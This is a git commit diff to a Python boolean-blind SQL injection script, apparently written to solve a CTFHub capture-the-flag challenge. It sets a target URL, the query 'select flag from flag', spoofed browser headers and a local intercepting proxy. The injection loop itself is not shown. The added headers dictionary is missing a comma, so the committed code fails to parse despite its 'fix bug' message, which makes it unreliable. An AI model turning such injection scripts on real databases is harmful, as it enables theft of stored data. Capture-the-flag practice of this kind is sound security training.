6d97b3723648e7b0c54fec96a262da9e300aec72
hoschen <29953808+hosch3n@users.noreply.github.com>
2020-11-24 17:41:57 +0800

    fix bug

--- SQL注入/布尔盲注/dichotomy.py
+++ SQL注入/布尔盲注/dichotomy.py
@@ -1,6 +1,7 @@
 import requests
 
-url = """http://challenge-7d1dd3a74e682725.sandbox.ctfhub.com:10080/?id=1"""
+burl = 'http://challenge-7d1dd3a74e682725.sandbox.ctfhub.com:10080/'
+url = f"""{burl}?id=1"""
 true_key = """query_success"""
 query_sql = """select flag from flag"""
 
@@ -10,7 +11,21 @@ data = {
 }
 
 headers = {
+    'Origin':  burl,
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.74 Safari/537.36 Edg/79.0.309.43',
+    'Referer':  f'{burl}/admin539/login.php'
+    'Connection': 'close',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
+    'Content-Type': 'application/x-www-form-urlencoded'
+}
+
+proxies = {
+  'http': 'http://127.0.0.1:8080',
+#   'https': 'https://127.0.0.1:8080',
 }
 
 # cookies = requests.utils.cookiejar_from_dict({'PHPSESSID': 'al9fueke3j06ggu128kjl3aoti'})
